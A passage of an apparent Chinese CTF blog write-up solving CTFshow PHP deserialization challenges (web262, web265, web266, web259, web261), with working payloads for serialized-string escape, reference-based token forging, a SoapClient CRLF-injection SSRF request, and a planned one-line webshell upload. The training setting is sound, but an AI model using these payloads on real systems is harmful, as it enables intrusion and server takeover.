class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>message.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考资料：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43431158/article/details/108210822">https://blog.csdn.net/qq_43431158/article/details/108210822</a>（Web262）</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107135706">https://blog.csdn.net/qq_45521281/article/details/107135706</a>（两种序列化）</p>
+<p>这里利用到了反序列化的逃逸，就是前面有一个看不懂的莫名其妙的将fuck替换为loveU的过程，这里就可以派上用场了。</p>
+<p>因为将fuck替换为loveU其实是增加了字符串的长度。而反序列化中其中有一个字段是用来说明字符串的字符个数的，导致传进去的字符串被替换后刚刚好在<code>&quot;;</code>前被截断了。只要字符个数会有多出来，然后成功把后面的括号给包含与闭合，任务就算完成了。</p>
+<p>由题目，我们的任务是将其token替换为admin，也就是只要后面这一段，要在$t上下手。</p>
+<p><code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></p>
+<p>这里一共新增27个字符，所以我们要写27个fuck。</p>
+<p>拼接后参数t为</p>
+<p><code>fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></p>
+<p>参数f和参数m随意设置，最后请求参数为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f:<span class="number">1</span></span><br><span class="line">m:<span class="number">1</span></span><br><span class="line">t:fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%<span class="number">22</span>;s:<span class="number">5</span>:%<span class="number">22</span>token%<span class="number">22</span>;s:<span class="number">5</span>:%<span class="number">22</span>admin%<span class="number">22</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问index.php出现 <code>Your message has been sent</code> 后新增cookies msg，内容随便设置，访问message.php，获得flag</p>
+<p>真是好累啊（擦汗）</p>
+<p>同样的，对于反序列化字符长度减小，我们也可以更换思路，将原有的字符串顶包补足给前一个参数，然后我们再在后面添加修改。</p>
+<p>比如这题，如果替换了一下，变成将loveU换成fuck那该怎么做呢？</p>
+<p>我们同样可以选择修改t参数，让他把原来的后面的参数给吃了。原来的参数序列化后为 <code>&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code>，那我们就写26个loveU，让他把后面吃了，我们自己再补充 <code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code> ，就可以解决字符串减小的反序列化漏洞。</p>
+<h1 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>对象内变量指针</li>
+</ul>
+<h2 id="做法-8"><a href="#做法-8" class="headerlink" title="做法"></a>做法</h2><p>从代码可以看出来，这里的token是被替换过的，所以从token下手是没办法的。但是可以看到login处又有判断要求token和password相同，那有什么办法呢？</p>
+<p>C语言里面讲过一个指针的思想，PHP上其实也可以应用，也可以被序列化，所以我们将password的值始终绑定到token上就可以了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>; <span class="comment">// 对password动手</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> ctfshowAdmin();</span><br><span class="line">    <span class="variable">$a</span>-&gt;password = &amp;<span class="variable">$a</span>-&gt;token;</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>输出 <code>O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;</code> ，丢到参数里拿到flag</p>
+<h1 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h1><h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>正则表达式</li>
+<li>PHP 函数/类命名不区分大小写</li>
+</ul>
+<h2 id="做法-9"><a href="#做法-9" class="headerlink" title="做法"></a>做法</h2><p>这题中可以看出，最后三行明显是不让你碰ctfshow这几个字，但题中的class偏偏是ctfshow，怎么办呢？</p>
+<p>行吧，这题就是考php基础，千算万算没算到PHP的函数是不区分大小写的。</p>
+<p>（以后可以留意正则最后面有没有加/i，没加就是不区分大小写）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ctfshow());</span><br></pre></td></tr></table></figure>
+
+<p>输出 <code>O:7:&quot;ctfshow&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;&#125;</code></p>
+<p>将ctfshow任意一个字母改为大写，成功拿flag</p>
+<p>绝！</p>
+<h1 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h1><p><code>本题目基于 PHP7.3.11</code></p>
+<h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/class.soapclient.php">SoapClient</a>，在反序列化时利用PHP原生类</li>
+<li>CRLF漏洞，即利用回车+换行（\r\n）注入到Header中</li>
+</ul>
+<h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>看flag.php的条件，首先要修改请求头XFF，使用ModHeader可以修改。同时要带上ctfshow的token，方可获得flag.txt。但看似简单，实际上直接请求flag.php就算作弊了，题目要求的应该是通过index.php来请求flag.php。</p>
+<p>虽然但是，不知道index.php想干嘛，题目提示了个flag.php，其实也跟index.php没啥关系嘛</p>
+<p>改header xff为127.0.0.1，同时post个token为ctfshow，成功。</p>
+<h2 id="官方の梦"><a href="#官方の梦" class="headerlink" title="官方の梦"></a>官方の梦</h2><p>参考地址：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113808539">https://blog.csdn.net/rfrder/article/details/113808539</a></p>
+<p><a target="_blank" rel="noopener" href="http://cn-sec.com/archives/145718.html">http://cn-sec.com/archives/145718.html</a></p>
+<p><del>上面那个解都不知道哪个傻子做的，还以为做1+1=2呢</del></p>
+<p>从 index.php 可以看出，该题打算在 index.php 中通过反序列化调用 flag.php 中的类，但题目中并没有明确地调用到flag.php。所以显然上述解法是错误的。SoapClient 是内置在 PHP 当中，可以直接被调用的一个类。</p>
+<p>同时，利用请求头的CRLF漏洞，对请求头的 Content-Length 进行覆盖，使其读完请求头后忽略后续数据与请求头。参考资料如下：</p>
+<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF Injection漏洞的利用与实例分析.html</a></p>
+<p>目前题目的目的就是要实例化 SoapClient，并对 <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a> 发出post请求。多次尝试后，发现正常进行一个POST请求必须带上下面的参数，且缺一不可：</p>
+<ul>
+<li>请求方式，请求路径，HTTP版本</li>
+<li>Host主机</li>
+<li>Content-Type 内容类型</li>
+<li>Content-Length 内容长度（用于截断后续请求）</li>
+<li>同时，对于本题目，还需要补充 XFF。</li>
+</ul>
+<p>在telnet中尝试此操作</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">telnet aaa.challenge.ctf.show <span class="number">8080</span></span><br><span class="line">Trying <span class="number">1.116</span>.<span class="number">34.181</span>...</span><br><span class="line">Connected to aaa.challenge.ctf.show.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"></span><br><span class="line">POST /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">4</span>dfd222c-c826-<span class="number">43e9</span>-bcd9-<span class="number">5</span>b2afef3dd68.challenge.ctf.show:<span class="number">8080</span></span><br><span class="line">X-Forwarded-<span class="keyword">For</span>: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">13</span></span><br><span class="line"></span><br><span class="line">token=ctfshow</span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-Type: text/html; charset=UTF-<span class="number">8</span></span><br><span class="line">Date: Mon, <span class="number">09</span> Aug <span class="number">2021</span> <span class="number">23</span>:<span class="number">16</span>:<span class="number">58</span> GMT</span><br><span class="line">Server: nginx/<span class="number">1.16</span>.<span class="number">1</span></span><br><span class="line">X-Powered-By: PHP/<span class="number">7.3</span>.<span class="number">11</span></span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以发现返回的Content-Length为0，则成功放置flag.php。</p>
+<p>同样的，在SoapClient中，我们要对Header进行下手，构造类似的头。为了区分头部和post内容，在头部和内容间应多一次回车换行。但SoapClient仅可修改User-Agent，所以我们要从User-Agent下手，修改后的User-Agent为</p>
+<p><code>ThisIsKellysBrowser\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow</code></p>
+<p>我们尝试对其他IP发送一次Post请求并抓包，看看到底发生了什么</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// web259.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$request</span> = <span class="keyword">new</span> SoapClient(</span><br><span class="line">        <span class="literal">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;ThisIsKellysBrowser\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>,</span><br><span class="line">                <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;useless&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://172.16.*.*/flag.php&#x27;</span></span><br><span class="line">            )</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$request</span>-&gt;getFlag();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$request</span>));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Internet Protocol Version <span class="number">4</span>, Src: <span class="number">172.16</span>.*.*, Dst: <span class="number">172.16</span>.*.*</span><br><span class="line">Transmission Control Protocol, Src Port: <span class="number">58943</span>, Dst Port: <span class="number">80</span>, Seq: <span class="number">1</span>, Ack: <span class="number">1</span>, Len: <span class="number">681</span></span><br><span class="line">Hypertext Transfer Protocol</span><br><span class="line">    POST /flag.php HTTP/<span class="number">1.1</span>\r\n</span><br><span class="line">    Host: <span class="number">172.16</span>.*.*\r\n</span><br><span class="line">    Connection: Keep-Alive\r\n</span><br><span class="line">    User-Agent: ThisIsKellysBrowser\r\n</span><br><span class="line">    X-Forwarded-<span class="keyword">For</span>: <span class="number">127.0</span>.<span class="number">0.1</span>\r\n</span><br><span class="line">    Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">    Content-Length: <span class="number">13</span>\r\n</span><br><span class="line">    \r\n</span><br><span class="line">    [Full request URI: http:<span class="comment">//172.16.*.*/flag.php]</span></span><br><span class="line">    [HTTP request <span class="number">1</span>/<span class="number">1</span>]</span><br><span class="line">    File Data: <span class="number">13</span> bytes</span><br><span class="line">HTML Form URL Encoded: application/x-www-form-urlencoded</span><br><span class="line">    Form item: <span class="string">&quot;token&quot;</span> = <span class="string">&quot;ctfshow&quot;</span></span><br><span class="line">        Key: token</span><br><span class="line">        Value: ctfshow</span><br><span class="line">Hypertext Transfer Protocol</span><br><span class="line">    Leading CRLF previous message in the stream may have extra CRLF</span><br><span class="line">    Content-Type: text/xml; charset=utf-<span class="number">8</span>\r\n</span><br><span class="line">    SOAPAction: <span class="string">&quot;useless#getFlag&quot;</span>\r\n</span><br><span class="line">    Content-Length: <span class="number">374</span>\r\n</span><br><span class="line">    \r\n</span><br><span class="line">    File Data: <span class="number">374</span> bytes</span><br><span class="line">eXtensible Markup Language</span><br><span class="line">Hypertext Transfer Protocol</span><br><span class="line">    File Data: <span class="number">2</span> bytes</span><br><span class="line">    Data (<span class="number">2</span> bytes)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这位wireshark同学对我们刚发出的请求十分疑惑，理论上来说发出token=ctfshow以后客户端方面就该闭嘴了，没想到他还在啪啪啪地发着他的头，他想干啥呢，事实上在服务端接收的时候，也是接收完token=ctfshow后就不理你了，服务端会正常接收请求并返回内容，往后的内容会当成下一次的请求处理。</p>
+<p>同时，毫无用处的uri也会在下方的SOAPAction中体现。不过我们的输入到token=ctfshow就结束了，所以后面的是真的没什么用。Host和路径会由SoapClient自动帮我们解析。</p>
+<p>但是请求过程中发现了一个问题，如果请求头中xff没有设置为 <code>X-Forwarded-For: 127.0.0.1, 127.0.0.1</code> ，则会抛出错误</p>
+<p><code>Fatal error: Uncaught SoapFault exception: [Client] looks like we got no XML document in /var/www/html/index.php:8 Stack trace: #0 /var/www/html/index.php(8): SoapClient-&gt;__call(&#39;getFlag&#39;, Array) #1 &#123;main&#125; thrown in /var/www/html/index.php on line 8</code></p>
+<p>原因：在flag.php中，有一句不起眼的 <code>$ip = array_pop($xff)</code> ，会将第一个XFF IP去掉，导致 flag.php 没法拿到ip，真是太可恨了（握拳</p>
+<p>所以，最终的payload应为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// web259.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$request</span> = <span class="keyword">new</span> SoapClient(</span><br><span class="line">        <span class="literal">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;ThisIsKellysBrowser\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;</span>,</span><br><span class="line">                <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;useless&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span></span><br><span class="line">            )</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$request</span>-&gt;getFlag();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$request</span>));</span><br></pre></td></tr></table></figure>
+
+<p>然后访问 /flag.txt ，获取flag。</p>
+<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><h3 id="HTTP的请求过程"><a href="#HTTP的请求过程" class="headerlink" title="HTTP的请求过程"></a>HTTP的请求过程</h3><p>首先用 telnet 建立一个socket连接进行尝试，我们这里尝试一个最简单的请求，就拿我刚才写的payload做例子吧</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">telnet localhost <span class="number">8888</span></span><br><span class="line">Trying ::<span class="number">1</span>...</span><br><span class="line">Connected to localhost.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"></span><br><span class="line">GET /web262.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ctfshow.local:<span class="number">8888</span></span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Mon, <span class="number">09</span> Aug <span class="number">2021</span> <span class="number">15</span>:<span class="number">06</span>:<span class="number">21</span> GMT</span><br><span class="line">Server: Apache</span><br><span class="line">X-Powered-By: PHP/<span class="number">7.4</span>.<span class="number">2</span></span><br><span class="line">Content-Length: <span class="number">128</span></span><br><span class="line">Content-Type: text/html; charset=UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line">Tzo3OiJtZ...</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们这里对 web262.php 进行 GET 请求只发送了两行，下面服务端就返回了完整的头部和内容。实际上，对于任何一个请求，客户端发送都必须要有这两行的要素。一，包括其请求方式、路径、http协议版本，二、请求的主机名。在没有curl而有telnet的情况下，大可以用这种方式来测试中间件服务器是否正常运作（不过一般不会有人这么干，也很少有只有telnet而没有curl的情况）</p>
+<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ul>
+<li><p>除了 SoapClient，有没有其他也能够被调用网页请求的类呢？</p>
+<p>  &lt;待补充&gt;</p>
+</li>
+<li><p>是否存在任何反序列化的文件都可以调用 SoapClient 达到对内网其他网站的请求或攻击？</p>
+<p>  理论上存在反序列化的地方都可以调用 SoapClient，前提是他能够调用一个不存在的方法。</p>
+</li>
+<li><p>为什么在 SoapClient 的变量中请求 getFlag 就能发起一次请求呢？</p>
+<p>  答：SoapClient 在调用不存在的方法的时候，会让SoapClient直接调用__call</p>
+</li>
+<li><p>为什么必须要设置 uri 和 location？我不设置可以吗</p>
+<p>  An array of options. If working in WSDL mode, this parameter is optional. If working in non-WSDL mode, you must set the location  and uri options, where location is the URL to request and uri is the target namespace of the SOAP service.<br>  ————————————————<br>  版权声明：本文为CSDN博主「gogiqp_jyh」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>  原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/gogiqp_jyh/article/details/17359053">https://blog.csdn.net/gogiqp_jyh/article/details/17359053</a></p>
+<p>  即工作于非WSDL模式下的时候，uri和location必须设置，uri为SOAP服务的目标命名空间，但实际上在本题并没有什么卵用，大可忽略。</p>
+</li>
+</ul>
+<h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><p><code>本题目基于 PHP7.4.16</code></p>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110558192">https://blog.csdn.net/miuzzx/article/details/110558192</a></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>根据上述题解中所述，</p>
+<p>如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，</p>
+<p>则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。</p>
+<p>所以在该题中，只有unserialize()会被激活。事实上随意构造一个payload尝试一下也是如此，仅仅调用了unserialize和destruct</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%207.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%207.png"></p>
+<p>同时还有一个关键，要在desturct时判断其code为0x36d（十进制为877）方可执行file_put_contents。留意一个条件，PHP在双等号时为弱类型判断。我们可以简单构造一个判断语句进行尝试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="number">877</span> == <span class="string">&quot;877jro2i3rio235oi2toin23iotnoi&quot;</span>; <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
+
+<p>PHP 返回结果为 1，那就好办了，只需要将 username 设为 877.php，password设为一句话木马即可。</p>
+<h2 id="做法-10"><a href="#做法-10" class="headerlink" title="做法"></a>做法</h2><p>最后的payload为</p>
